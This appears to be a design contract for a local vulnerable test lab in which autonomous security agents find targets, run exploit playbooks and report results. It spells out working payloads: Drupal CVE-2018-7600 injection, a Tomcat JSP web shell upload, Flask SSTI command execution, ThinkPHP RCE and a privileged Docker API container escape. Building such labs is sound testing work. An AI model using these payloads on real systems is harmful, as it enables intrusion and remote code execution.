# Contract: Lab-Agent Interface

**Phase**: 1 — Design & Contracts
**Date**: 2026-06-02
**Status**: Final

## Overview

Defines the interface between the Vulnerable Test Lab and autonomous security agents. Agents discover targets via port scanning, execute exploit playbooks, and report results to the central API.

## Target Discovery Contract

Agents discover targets by scanning the host's published ports. Each target has a fixed port mapping:

| Target | Host | Protocol | Service Fingerprint |
|--------|------|----------|--------------------|
| Drupal | localhost:8081 | HTTP | Drupal 8 login page at `/user/login` |
| Tomcat | localhost:8082 | HTTP | Tomcat default page at `/` |
| Flask | localhost:8000 | HTTP | "Hello {name}" page at `/?name=world` |
| ThinkPHP | localhost:8083 | HTTP | ThinkPHP 5 welcome page at `/` |
| Docker API | localhost:2375 | TCP | Docker Engine API version at `/version` |

## Exploit Playbook Contract

Each target exposes an exploit endpoint. Agents use this template format:

```json
{
  "playbook": {
    "target": "<target-name>",
    "cve": "<CVE-ID>",
    "method": "<HTTP-method>",
    "endpoint": "<url-path>",
    "headers": { "<key>": "<value>" },
    "payload": "<payload-template>",
    "validation": {
      "layers": ["L1", "L2", "L3"],
      "command": "<post-exploit command to run>"
    }
  }
}
```

### Per-Target Playbooks

**Drupal**:
```json
{
  "target": "drupal",
  "cve": "CVE-2018-7600",
  "method": "POST",
  "endpoint": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
  "contentType": "application/x-www-form-urlencoded",
  "payload": "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]={cmd}",
  "successIndicator": "command output in response body"
}
```

**Tomcat**:
```json
{
  "target": "tomcat",
  "cve": "CVE-2017-12615",
  "method": "PUT",
  "endpoint": "/{shell_name}.jsp/",
  "payload": "<%@ page import=\"java.io.*\" %><% String c = request.getParameter(\"c\"); Process p = Runtime.getRuntime().exec(c); BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while ((l = r.readLine()) != null) out.println(l); %>",
  "successIndicator": "JSP accessible and executable at GET /{shell_name}.jsp?c={cmd}"
}
```

**Flask**:
```json
{
  "target": "flask",
  "cve": "N/A (SSTI)",
  "method": "GET",
  "endpoint": "/?name={payload}",
  "payload": "{{ lipsum.__globals__[\"os\"].popen(\"{cmd}\").read() }}",
  "successIndicator": "command output rendered in HTML response"
}
```

**ThinkPHP**:
```json
{
  "target": "thinkphp",
  "cve": "CVE-2018-20062",
  "method": "GET",
  "endpoint": "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}",
  "successIndicator": "command output in HTTP response body"
}
```

**Docker API**:
```json
{
  "target": "docker-api",
  "cve": "N/A (misconfiguration)",
  "method": "POST",
  "endpoint": "/containers/create?name=exploit",
  "payload": "{\"Image\":\"alpine\",\"Cmd\":[\"sh\",\"-c\",\"{cmd}\"],\"Binds\":[\"/:/mnt:rbind\"],\"Privileged\":true}",
  "followUp": [
    "POST /containers/exploit/start",
    "GET /containers/exploit/logs?stdout=true"
  ],
  "successIndicator": "command output returned from Docker logs"
}
```

## Exploitation Validation Contract

After executing an exploit, agents validate success using the 3-layer fallback approach:

```json
{
  "validation": {
    "L1": {
      "description": "Check marker file absence",
      "command": "[ ! -f /tmp/agent_is_present ] && echo 'L1_PASS' || echo 'L1_FAIL'",
      "expectedOutput": "L1_PASS",
      "fallbackOn": "command not found or unexpected output"
    },
    "L2": {
      "description": "Environment fingerprint",
      "commands": [
        "ip a | grep -E '172\\.(1[6-9]|2[0-9]|3[01])' && echo 'L2_CONTAINER_NET'",
        "cat /proc/1/cgroup | grep -q docker && echo 'L2_DOCKER_CGROUP'",
        "hostname | grep -qE '^[a-f0-9]{12}$' && echo 'L2_CONTAINER_HOSTNAME'"
      ],
      "expectedOutput": "any L2_* match confirms target environment",
      "fallbackOn": "all commands fail or return empty"
    },
    "L3": {
      "description": "Create unique audit artifact",
      "command": "touch /tmp/pwned_$(date +%s_%N) && ls -la /tmp/pwned_*",
      "expectedOutput": "/tmp/pwned_<timestamp>_<nanoseconds>",
      "fallbackOn": "N/A (final layer)"
    }
  }
}
```

## Reporting Contract

Agents report results to the central API at `http://localhost:8080/api/reports`:

```json
{
  "agentId": "AGT-<uuid>",
  "targetName": "<drupal|tomcat|flask|thinkphp|docker-api>",
  "cveId": "<CVE-YYYY-NNNNN>",
  "timestamp": "<ISO-8601-datetime>",
  "success": true,
  "validationLayersUsed": ["L1", "L3"],
  "validationOutput": {
    "L1": "L1_PASS (marker file absent)",
    "L3": "/tmp/pwned_1717344000_123456789"
  },
  "commandExecuted": "<truncated-first-500-chars>",
  "responseSummary": "<truncated-first-500-chars>"
}
```
